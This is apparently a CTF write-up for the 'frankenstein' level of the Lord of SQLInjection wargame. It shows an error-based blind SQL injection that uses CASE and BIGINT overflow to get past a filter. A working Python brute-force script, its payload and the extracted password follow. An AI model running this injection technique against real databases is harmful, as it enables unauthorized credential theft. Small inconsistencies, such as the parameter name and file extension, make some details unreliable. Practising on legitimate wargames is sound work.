---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 28
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/6915fb41-8baa-45e1-98b3-c45d05e0ec03)

We are provided with the SQL query:

```sql
SELECT id,pw FROM prob_frankenstein WHERE id='frankenstein' AND pw='{$_GET[pw]}'
```

## Filter:

This challenge filters the following: `_`, `.`, `(`, `)`, `union`.

Therefore we cannot use the  `length()` function and `if()` statements.
In order to get around this, we will have to use `CASE` statements.

## Error-based Blind SQL Injection

### ERROR 1690 (22003): BIGINT value is out of range[​](https://writeups-kunull.vercel.app/Lord%20of%20SQLInjection/iron_golem#error-1690-22003-bigint-value-is-out-of-range "Direct link to ERROR 1690 (22003): BIGINT value is out of range")

In SQL the maximum value for a column is `9223372036854775807`. If the value exceeds the limit, it throws the `ERROR 1690 (22003): BIGINT value is out of range` error message.

This is the error we will be exploiting.
### Wildcard

We also need to use the (`%`) wildcard character. It represents zero or more characters after teh specified character.

```
1% = 10, 100, 1200, etc
```

If we provide the following URI parameter:

```
?id=' || CASE WHEN id='admin' AND pw LIKE '[password_substring]%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -
```

The resultant query becomes:

```sql
SELECT id,pw FROM prob_frankenstein WHERE id='' || CASE WHEN id='admin' AND pw LIKE '[password_substring]%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -' AND pw='{$_GET[pw]}'
```

If the `[password_substring]` that we provide for `id='admin'` matches part of the `pw`, the `0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF` operation will be performed. Since the result of the multiplication operation would be greater than `9223372036854775807`, the challenge would throw an error if the condition is met.

### Script

```python title="frankenstein_script.md"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': '4qt1p0e0vguiq8oousdc88vhv9'}
url = 'https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php'

password = ''
end = False
searchspace = string.digits + string.ascii_letters
print()

for index in range(1, 100):
  if (end == True):
    break
  end = True

  for char in searchspace:
    payload = f"' || CASE WHEN id='admin' AND pw LIKE '{password}{char}%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f'{url}?pw={encoded_payload}'

    response = requests.get(full_url, cookies=cookies)

    if ("login_chk" in response.text):
      continue
    elif ("error" in response.text):
      print(f'[+] Character at index {index}: {char}')
      password = password + char
      end = False
      break

print()
print(f'[!] Extracted password: {password}')
print(f'[!] Final payload: ?pw={password}')
```

```
$ python .\frankenstein_script.py

[+] Character at index 1: 0
[+] Character at index 2: d
[+] Character at index 3: c
[+] Character at index 4: 4
[+] Character at index 5: e
[+] Character at index 6: f
[+] Character at index 7: b
[+] Character at index 8: b

[!] Extracted password: 0dc4efbb
[!] Final payload: ?pw=0dc4efbb
```

If we provide the following URI parameter:

```
?pw=0dc4efbb
```

The resultant query becomes:

```sql
SELECT id,pw FROM prob_frankenstein WHERE id='frankenstein' AND pw='0dc4efbb'
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/bef1ff18-ace7-4eed-ab14-e9584686da12)
